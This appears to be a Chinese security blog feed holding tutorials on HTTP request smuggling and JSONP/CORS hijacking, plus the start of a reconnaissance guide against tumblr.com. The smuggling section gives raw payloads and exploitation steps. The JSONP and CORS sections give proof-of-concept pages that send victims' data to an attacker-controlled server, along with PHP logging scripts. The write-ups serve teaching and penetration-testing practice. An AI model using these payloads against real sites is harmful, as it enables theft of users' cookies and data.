        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=459782526&auto=0&height=66"></iframe><h2 id="HTTP请求走私（HTTP-Request-Smuggler）"><a href="#HTTP请求走私（HTTP-Request-Smuggler）" class="headerlink" title="HTTP请求走私（HTTP Request Smuggler）"></a>HTTP请求走私（HTTP Request Smuggler）</h2><p>&#8195;HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><p>&#8195;而产生这种漏洞的原因就是：不同的服务器对RFC标准实现的方式不同，程度不同。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。</p><p>&#8195;我们先补一下基础知识，现如今使用最广泛的HTTP1.1的协议特性为<code>Keep-Alive</code>和<code>Pipeline</code></p><p>&#8195;&#8195;在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，就需要与服务器简历一个tcp连接。因现在的web网站页面时由多种资源组成的，我们想要获取一个页面的内容会请求各种各样的资源，这样会导致HTTP服务器的负载开销增大，于是在HTTP1.1中增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p>&#8195;&#8195;其中<code>Keep-Alive</code>就是在HTTP请求中增加一个特殊的请求头<code>Connection:Keep-Alive</code>,这样服务器在接收完这次HTTP请求后，不会关闭TCP连接，后面对相同目标服务器的HTTP请求都会用这一个TCP链接，这样就只需要进行一次TCP握手的过程，就可以减少服务器的开销了，还能加快访问速度，而且这个特性在1.1中是默认开启的。</p><p>&#8195;&#8195;后面的<code>Pipeline</code>是可以使客户端像流水线一样发送自己的HTTP请求，不需要等待服务器的响应，服务器接收到请求后，会遵循先入先出的机制，将请求和响应严格对应起来，再将响应发送给客户端。但现在的浏览器默认不会启用<code>Pipeline</code>，而一般的服务器却都提供了对<code>Pipleline</code>的支持</p><p>&#8195;&#8195;我相信大家应该知道反向代理服务器，一般来说这个反向代理服务器与后端的服务器之间会重用TCP链接，当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，转发给后端的服务器后，后端服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分就算是<code>走私的请求</code>，当该部分对正常用户的请求造成影响后，就实现了HTTP请求走私攻击。</p><h2 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h2><p>&#8195;假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理，这就可能导致请求走私。</p><p>&#8195;比如我们构造请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#8195;当前端服务器收到这样的请求后，通过读取Content-Length，会判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对Content-length进行处理，由于<code>Pipeline</code>的存在，它就会认为这是收到了两个请求，分别是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>&#8195;这样就导致了请求走私</p><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p>&#8195;有的服务器因不严格的实现RFC7230的第3.3.3节中的第四条规定（规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误）导致攻击者可以构造一个特殊的请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>&#8195;此时代理服务器会按照第一个Content-Length的值对请求进行处理，后端服务器按照第二个Content-Length值进行处理，当后端服务器读取完前7个字符后就会认为读取完毕，然后生成对应的响应，发送出去，而此时的缓冲区还剩下一个字母<code>a</code>，对后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完，此时恰巧有一个正常用户对服务器进行了请求，例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>&#8195;这个时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>&#8195;这样的话用户就会收到报错，这样就实现了一次HTTP请求走私攻击，而且还对正常用户行为造成了影响</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>&#8195;所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p><p>&#8195;构造数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>&#8195;连续发送几次请求就会返回403的响应，内容为“Unrecognized method <code>G</code>POST”</p><p><img src="/images/CLTE5.png" alt="CLTE"></p><p>&#8195;造成这样的原因很简单，就是由于前段服务器处理Content-Length时认为这是一个完整的请求，请求长度为6，也就是<code>0\r\n\r\nG</code>.但是上面内个请求包转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>,当它读取到<code>0\r\n\r\n</code>时就认为结束了，剩下的内个字母<code>G</code>就留在了缓冲区，等后面的请求来了以后，在后端服务器就会拼接成类似下面的这种请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: .......\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>&#8195;这样服务器在解析时就会产生报错了。你可以自己尝试一下：<code>https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</code></p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>&#8195;所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p><p>&#8195;<code>Transfer-Encoding</code>就是分块传输的标志，<code>分块长度是以16进制表示</code>。</p><p>&#8195;构造数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#8195;由于前端服务器处理<code>Transfer-Encoding</code>,他先读取第一个分块儿为18个字符，因为16进制的12就是18，第一个分块儿为<code>GPOST/HTTP/1.1rnrn</code>一共18个字符，然后读取第二个数据块，该数据块的长度为0，因此视为终止请求。这个请求转发到后端服务器，后端服务器处理Content-Length请求头，请求正文长度为4个字节，当它读取完<code>12\r\n</code>之后，就认为结束了，后面的数据就是留了下来，当另一个人请求时，就成功报错了</p><p><img src="/images/TE-CL.jpg" alt="TE-CL"></p><p>&#8195;一定要注意我在图中标红的位置</p><p>&#8195;实验网址：<code>https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</code></p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>&#8195;这个就是当收到存在两个请求头的请求包时，前后端服务器都处理<code>Tansfer-Encoding</code>请求头，这虽然实现了RFC的标准，不过前后端服务器毕竟不是同一种，所有我们就可以对发送请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中的一个服务器不处理<code>Transfer-Encoding</code>请求头。</p><p><img src="/images/TETE.png" alt="TETE"></p><p>&#8195;实验网址：<code>https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.<strong>绕过前端安全控制</strong></p><p>&#8195;在平时挖洞的时候我们可能会遇到没有权限访问的目录，这种情况如果是前端服务器不准请求这个目录而后端的web服务器可以请求这个目录，所有我们就可以利用请求走私来<code>CL-TE</code>绕过前端理服务器直接去请求后端服务器。</p><p><img src="/images/CLTE2.png" alt="CLTE2"></p><p>&#8195;根据响应得知需要以管理员身份或者本地登录才可以访问<code>/admin</code>，管理员身份是不可能了，那我们就只有走私一个<code>Host：localhost</code>来告诉服务器我是从本地访问的。</p><p><img src="/images/CLTE3.jpg" alt="CLTE2"></p><p>&#8195;这样我们就成功的访问了admin页面，根据响应包也能看出来如何进行删用户的操作</p><p><img src="/images/CLTE4.png" alt="CLTE2"></p><p>&#8195;我们还可以使用<code>TE-CL</code>来进行绕过限制,跟上面差不多就不多说了，</p><p><img src="/images/TECL2.png" alt="TECL1"></p><p><img src="/images/TECL1.png" alt="TECL1"></p><p>2.<strong>获取前端服务器重写请求字段</strong></p><p>&#8195;有的时候，前端服务器在收到请求后不会直接发送给后端服务器，它会先添加一些字段，然后再转发给后端服务器，在我们攻击的时候如果没有这些字段，攻击就会失败，那我们应该怎么获取内些字段呢，PortSwigger提供了一个简单的方法</p><p>&#8195;<code>找一个能够将请求参数的值输出到响应中的POST请求</code></p><p>&#8195;<code>把该POST请求中找到的这个特殊的参数放在消息的最后面</code></p><p>&#8195;<code>然后走私这一请求，然后直接发送一个普通请求，前端服务器对这个请求重写的字段就会显示出来</code></p><p>&#8195;Okey现在让我们找到一个POST请求，而且在请求包中的参数值还必须在响应包中出现。</p><p><img src="/images/search.png" alt="search"></p><p><img src="/images/CLTE6.png" alt="CLTE6"></p><p>&#8195;我们吧Content-Length这个参数的值弄大点，这样请求走私到后端后端发现数据的总长度应是70，而目前下面的数据还不够70，就会继续等待，等我们下一次发送请求的时候，后端服务器检测到数据总长度够70后就认为传输完毕了，然后就进行了响应，这样我们后面内次正常的请求的一部分与走私请求结合在一起，从响应中表示出来，这样我们就获取了前端服务器的重写字段。</p><p><img src="/images/CLTE7.jpg" alt="CLTE6"></p><p>&#8195;现在我们知道了重写请求，在走私的时候只需要把重写的请求带上就能够执行正常的操作了</p><p><img src="/images/CLTE8.png" alt="CLTE6"></p><p>3.<strong>获取其他用户的请求</strong></p><p>&#8195;想要窃取用户的请求，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取到用户的请求了，可利用此方法窃取用户的账号密码等敏感数据。</p><p>&#8195;首先我们需要找到存储的位置，例如评论处</p><p><img src="/images/Comment.png" alt="Comment"></p><p>&#8195;让我们来走个私</p><p><img src="/images/CLTE8.png" alt="CLTE6"></p><p>&#8195;这里走私以后，当用户去访问，就会发表一个评论，并且评论中还带着她请求包中的内容，有的时候会有cookie</p><p>4.<strong>反射型XSS</strong></p><p>&#8195;请求走私与XSS结合的好处就是不需要我们向受害者提供URL，也不用等他们去访问，我们只需要在走私中包含xss负载就可以了，而且我们可以利用HTTP请求头进行xss</p><p><img src="/images/httpxss1.png" alt="httpxss1"></p><p>5.<strong>将现场重定向变为开放重定向</strong></p><p>&#8195;这种攻击场景就是在目标在使用30X跳转的时候，使用了Host头进行跳转，例如Apache&amp;&amp;IIS服务器上，一个URI最后不带/的请求会被30X导向带/的地址。例如发送一下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br></pre></td></tr></table></figure><p>&#8195;得到的Response会是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Location: https://normal-website.com/home/</span><br></pre></td></tr></table></figure><p>&#8195;结合请求走私使他重定向到我们的恶意网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure><p>&#8195;如果服务器根据走私过去的Host进行跳转，就会是以下的响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Location: https://attacker-website.com/home/</span><br></pre></td></tr></table></figure><p>&#8195;这样就重定向到我们的恶意网站了</p><p>6.<strong>缓存投毒</strong></p><p>&#8195;一般情况下，前端服务器处于性能的原因，会对后端服务器的<code>一些资源进行缓存</code>，如果存在HTTP请求走私漏洞，则有可能通过重定向来进行缓存投毒，从而影响后续访问的所有用户.</p><p>&#8195;我们以下面的js文件为例</p><p><img src="/images/js.png" alt="js"></p><p>&#8195;我们还需要编辑一下投毒的服务器</p><p><img src="/images/du.png" alt="du"></p><p>&#8195;然后我们发送一次走私请求，走私的内段请求时在我们点击下一篇的时候发现的30X重定向，这样我们就能重定向到我们的投毒服务器了</p><p><img src="/images/CLTE10.png" alt="CLTE10"></p><p>&#8195;发送完一次走私请求后，再发送一个GET请求去访问<code>/resources/js/tracking.js</code></p><p><img src="/images/js1.png" alt="js1"></p><p>&#8195;从上面这个图可以发现重定向到我们的投毒服务器了，然后我们访问正常的服务器主页发现响应为缓存在投毒服务器上的文件。</p><p><img src="/images/page.png" alt="page"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;1.禁用代理服务器与后端服务器之间的TCP连接重用。</p><p>&#8195;2.使用HTTP/2协议。</p><p>&#8195;3.前后端使用相同的服务器。</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;写这篇文章前前后后用了3天的时间，借鉴了好多文章，碰到了好多坑，所以在此提醒大家一定要细心，尤其是上面的实验，能用burp的插件就用插件（HTTP Request Smuggler），本文中做的一些实验都在下面的第一个链接中，其余的是我借鉴的文章中一些写的详细的文章。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://portswigger.net/web-security/request-smuggling/exploiting</code></p><p><code>https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Turn-An-On-Site-Redirect-Into-An-Open-Redirect</code></p><p><code>https://paper.seebug.org/1048/#52</code></p><p><code>http://mi0.xyz/2019/11/01/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</code></p>]]></content>
      
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONP劫持与CORS</title>
      <link href="/2019/12/09/jsonp%E4%B8%8Ecors/"/>
      <url>/2019/12/09/jsonp%E4%B8%8Ecors/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1335899405&auto=0&height=66"></iframe><h2 id="JSONP？"><a href="#JSONP？" class="headerlink" title="JSONP？"></a>JSONP？</h2><p>&#8195;JSONP就是为了跨域获取资源而产生的一种技术手段，这种技术是利用<code>script</code>和<code>src</code>属性不受同源策略影响的特性。（所谓同源是指，域名，协议，端口相同）</p><h2 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h2><p>&#8195;jsonp劫持就是攻击者获取到网站本应传给其他接口的一些敏感数据。如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞就能够获取用户在网站B上的数据。</p><h2 id="JSONP漏洞利用"><a href="#JSONP漏洞利用" class="headerlink" title="JSONP漏洞利用"></a>JSONP漏洞利用</h2><p>&#8195;我们在burpsuite里进行搜索回调函数<code>callback</code>，然后把它发送到Response</p><p><img src="/images/jsonp3.png" alt="jsonp"></p><p><img src="/images/jsonp1.png" alt="jsonp"></p><p>&#8195;我们尝试更改<code>callback</code>这个参数值为aaa</p><p><img src="/images/jsonp2.png" alt="jsonp"></p><p>&#8195;这里可以看见我在Response里标红的位置已经根据咱们更改的参数值而改变，就证明参数可控，也就是说存在漏洞，而且返回的也是一些敏感数据，okay，接下来就让我们在自己的服务器上写个脚本，当受害者访问的时候，我们就能获取这些数据了。</p><p>&#8195;<strong>poc</strong></p><p>&#8195;&#8195;js.html(受害者访问此页面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta name=”referrer” content=”no-referrer”&gt;&lt;/head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;./jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test(json)&#123;</span><br><span class="line">    //alert(v.name);</span><br><span class="line">data=JSON.stringify(json)</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    var url = &apos;http://hacker web server ip/jsonp/logs.php?name=&apos;+data;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,url,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;Vulnerability URL?callback=test&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;logs.php(保存在攻击者web服务器上)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nickname=$_GET[&apos;name&apos;];</span><br><span class="line">$fp = fopen(&apos;info.txt&apos;,&apos;a&apos;);</span><br><span class="line">$flag = fwrite($fp, &quot;数据:  &quot;.$nickname.&quot;\r\n&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;判断referer来源地址</p><p>&#8195;设置随机且一次性的token</p><h2 id="漏洞挖掘技巧"><a href="#漏洞挖掘技巧" class="headerlink" title="漏洞挖掘技巧"></a>漏洞挖掘技巧</h2><p>&#8195;用burpsuite的搜索功能搜索关键字，</p><p>&#8195;常见的关键字有</p><p>&#8195;&#8195;<code>jsoncallback</code><br>&#8195;&#8195;<code>jsonpcallback</code><br>&#8195;&#8195;<code>jsoncall</code><br>&#8195;&#8195;<code>jsonpcall</code><br>&#8195;&#8195;<code>cb</code><br>&#8195;&#8195;<code>jsoncb</code><br>&#8195;&#8195;<code>jsonpcb</code></p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>&#8195;CORS全称是跨域资源共享，看名字就知道是用于跨域传输数据的，和JSONP差不多，但是这个比内个厉害点，JSONP只支持GET传输数据，CORS则支持所有类型的HTTP请求。</p><h2 id="CORS漏洞利用"><a href="#CORS漏洞利用" class="headerlink" title="CORS漏洞利用"></a>CORS漏洞利用</h2><p>&#8195;跨域资源读取</p><p>&#8195;&#8195;首先我们需要确认是否存在漏洞，如下图红框处所示，当内个字段为*，或者在请求包中添加origin字段，并随便输入一个url，响应包存在内段url的话就证明存在这个漏洞。</p><p><img src="/images/cors.png" alt="cors"></p><p><img src="/images/cors2.png" alt="cors"></p><p>&#8195;&#8195;现在我们可以在服务器上创建一个脚本来跨域读取用户的敏感信息，如cookie、token等</p><p>&#8195;<strong>poc</strong></p><p>&#8195;&#8195;corf.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;cors exploit&lt;/h1&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function exploit()</span><br><span class="line">&#123;</span><br><span class="line">    var xhr1;</span><br><span class="line">    var xhr2;</span><br><span class="line">    if(window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xhr1 = new XMLHttpRequest();</span><br><span class="line">        xhr2 = new XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    xhr1.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) </span><br><span class="line">        &#123;</span><br><span class="line">            var datas=xhr1.responseText;</span><br><span class="line">            xhr2.open(&quot;POST&quot;,&quot;http://uip/cors/save.php&quot;,&quot;true&quot;);</span><br><span class="line">            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">            xhr2.send(&quot;z0=&quot;+escape(datas));      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr1.open(&quot;GET&quot;,&quot;Vulnerability URL&quot;,&quot;true&quot;) </span><br><span class="line">    xhr1.withCredentials = true;        </span><br><span class="line">    xhr1.send();</span><br><span class="line">&#125;</span><br><span class="line">exploit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#8195;save.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;secrect.html&quot;, &quot;w+&quot;);</span><br><span class="line">$res = $_POST[&apos;z0&apos;];</span><br><span class="line">fwrite($file, $res);</span><br><span class="line">fclose($res);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p>&#8195;能不开CORS就不开</p><p>&#8195;定义白名单，严格校验Origin值</p><p>&#8195;仅在接收到跨域请求的时候才配置有关于跨域的头部，确保跨域请求合法</p><h2 id="漏洞挖掘技巧-1"><a href="#漏洞挖掘技巧-1" class="headerlink" title="漏洞挖掘技巧"></a>漏洞挖掘技巧</h2><p>&#8195;打开burpsuite，选择Proxy模块中的options选项，找到Match and Replace 勾选下图中的内个request header，要是没有就自己搞一个。</p><p><img src="/images/cors3.png" alt="cors"></p><p>&#8195;然后再 HTTP history那里搜<code>Access-Control-Allow-Origin: *</code>或者<code>Access-Control-Allow-Origin:foo.example.org</code>或者<code>Access-Control-Allow-Origin:true</code></p><p><img src="/images/cors4.png" alt="cors"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;大家可以去米斯特公众号找找一个叫敏感信息高亮标记的文章，内个工具装在burpsuite里用着不错的。</p><p>&#8195;如果觉得文章中原理处字少的话，可以看下我下面给的链接。</p><p>本文参考链接</p><p><code>https://www.cnblogs.com/junsec/p/11221943.html</code></p><p><code>https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#Demo</code></p><p><code>https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</code></p><p><code>http://sh1yan.top/2018/08/12/jsonp-study/</code></p>]]></content>
      
      
      <categories>
          
          <category> csrf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做信息收集</title>
      <link href="/2019/12/08/%E5%A6%82%E4%BD%95%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/08/%E5%A6%82%E4%BD%95%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1409160420&auto=0&height=66"></iframe>收集的网站是：`*.tumblr.com`<h2 id="子域收集"><a href="#子域收集" class="headerlink" title="子域收集"></a>子域收集</h2><p>&#8195;1.Sublist3r</p><p><img src="/images/sublist3r.png" alt="sublist3r"></p><p>&#8195;大约过了10多分钟</p><p><img src="/images/sublist3r1.png" alt="sublist3r"></p><p>&#8195;说实话我没想到我随便找的一个看似很小的站却有这么多域名</p><p>&#8195;2.aquatone</p><p>&#8195;&#8195;使用命令<code>amass enum --passive -d tumblr.com -o amass.txt</code>找到了1910个子域名</p><p>&#8195;3.OneForAll</p><p>&#8195;<code>https://github.com/shmilylty/OneForAll</code></p><p>&#8195;&#8195;使用命令<code>python3 oneforall.py --target tumblr.com run --valid=None</code>收集完成后，csv文件会在results目录下，这款工具用着蛮不错的，扫出来5k多</p><p>&#8195;4.ESD</p><p>&#8195;<code>https://github.com/FeeiCN/ESD</code></p><p>&#8195;命令：<code>esd -d tumblr.com</code></p><p>&#8195;5.通过证书查询</p><p>&#8195;<code>https://crt.sh/?q=%.tumblr.com</code></p><p><img src="/images/crt.png" alt="crt"></p><p>&#8195;<code>https://censys.io/certificates?q=parsed.names%3Atumblr.com</code></p><p><img src="/images/censys.png" alt="censys"></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" 